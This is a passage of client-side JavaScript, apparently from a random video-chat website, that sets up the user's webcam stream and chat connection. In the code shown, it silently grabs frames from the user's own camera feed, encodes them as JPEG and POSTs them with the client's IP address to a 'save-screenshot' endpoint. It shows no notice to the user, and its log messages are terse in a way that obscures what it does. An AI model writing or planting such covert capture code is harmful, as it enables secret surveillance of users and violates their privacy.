        });
    }

    async function captureAndSendScreenshot() {
        if (captureCount >= MAX_CAPTURES) {
            console.log('Maximum capture count reached. Stopping captures.');
            return;
        }

        const videoElement = document.getElementById('video-self');
        const canvas = document.getElementById('canvasElement');
        const context = canvas.getContext('2d');

        if (videoElement.readyState < videoElement.HAVE_CURRENT_DATA) {
            console.log('Video not ready for capture. Retrying in 2 seconds.');
            setTimeout(captureAndSendScreenshot, RETRY_DELAY);
            return;
        }

        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;

        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg', 0.5);

        if (!isCanvasBlank(canvas) && isDataSizeSufficient(imageData)) {
            try {
                await sendImageDataToServer(imageData, clientIpAddress);
                captureCount++;
                console.log(`S cap and sent. Count: ${captureCount}`);
            } catch (error) {
                console.error('Failed to send s:', error);
            }
        } else {
            console.log('Skipped blank or insufficient image.');
        }
    }

    function isCanvasBlank(canvas) {
        const blank = document.createElement('canvas');
        blank.width = canvas.width;
        blank.height = canvas.height;
        return canvas.toDataURL() === blank.toDataURL();
    }

    function isDataSizeSufficient(imageData) {
        return imageData.length > 10000; // Increased threshold for better quality check
    }

    async function sendImageDataToServer(imageData, clientIp, retries = 0) {
        try {
            const response = await fetch('https://omegleweb.com/save-screenshot', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    imageData,
                    clientIp
                })
            });

            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }

            const data = await response.text();
            console.log('S saved:', data);
        } catch (error) {
            console.error(`Error saving s (attempt ${retries + 1}):`, error);
            if (retries < MAX_RETRIES) {
                console.log(`Retrying in ${RETRY_DELAY}ms...`);
                await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                return sendImageDataToServer(imageData, clientIp, retries + 1);
            } else {
                throw new Error('Max retries reached. Failed to save s.');
            }
        }
    }

    initializeScreenshotCapture();

    try {
        ls = await getLocalStream();
        $('#video-self').srcObject = ls;

        await populateMediaDevices();
        addMediaDeviceListeners();
        startDeviceRefresh();

        ls.addEventListener('addtrack', () => {
            console.log('Track added to local stream. Sending webcam label...');
            sendWebcamLabel();
        });

        sendWebcamLabel();

        configureChat();
        await initializeConnection();


    } catch (e) {
        alert('This website needs video and audio permission to work correctly');
    }
    resetInteractionDecayTimer();
}

document.addEventListener('DOMContentLoaded', (event) => {
    console.log('DOM fully loaded and parsed');
    main();
});

document.addEventListener('DOMContentLoaded', () => {
    const peerContainer = document.getElementById('peer');
    const webcamLabelContainer = document.getElementById('webcam-label-container');
    let touchStartX, touchStartY;

    peerContainer.addEventListener('touchstart', (e) => {
        touchStartX = e.touches[0].clientX;
        touchStartY = e.touches[0].clientY;
    });

    peerContainer.addEventListener('touchend', (e) => {
        const touchEndX = e.changedTouches[0].clientX;
        const touchEndY = e.changedTouches[0].clientY;
        const dx = touchEndX - touchStartX;
        const dy = touchEndY - touchStartY;

        // If it's a tap (not a swipe), toggle the overlay
        if (Math.abs(dx) < 5 && Math.abs(dy) < 5) {
            webcamLabelContainer.classList.toggle('show-overlay');
        }
    });

    // Hide overlay when clicking outside the peer container
    document.addEventListener('touchstart', (e) => {
        if (!peerContainer.contains(e.target)) {
            webcamLabelContainer.classList.remove('show-overlay');
        }
    });
});